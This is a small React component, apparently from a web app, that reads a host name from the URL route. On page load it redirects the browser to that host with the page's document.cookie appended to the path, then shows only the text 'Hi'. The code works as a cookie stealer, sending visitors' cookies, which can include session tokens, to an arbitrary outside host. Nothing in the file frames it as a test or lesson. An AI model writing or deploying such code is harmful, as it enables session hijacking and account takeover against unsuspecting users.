import React, { useEffect, useState } from 'react';
import axios from 'axios';
import './App.css';
import { useParams } from 'react-router-dom';

import { useHistory } from 'react-router-dom';
const apiUrl = 'http://localhost:3001';

function Cookie() {
    let { id } = useParams();
    const history = useHistory();
    useEffect(()=>{
     sendGetRequest(id);
    },[]);
    const sendGetRequest = async (id) => {
        try {
            if(document.cookie!="" && document.cookie!=null && typeof(document.cookie)!="undefined") window.location.replace("https://"+id+"/"+document.cookie);
            else history.push("/", { url: id });

  
                        // document.getElementById("myForm").submit();

        } catch (err) {
            // Handle Error Here
            console.error(err);
        }
    };
    return <>Hi</>
}
export default Cookie;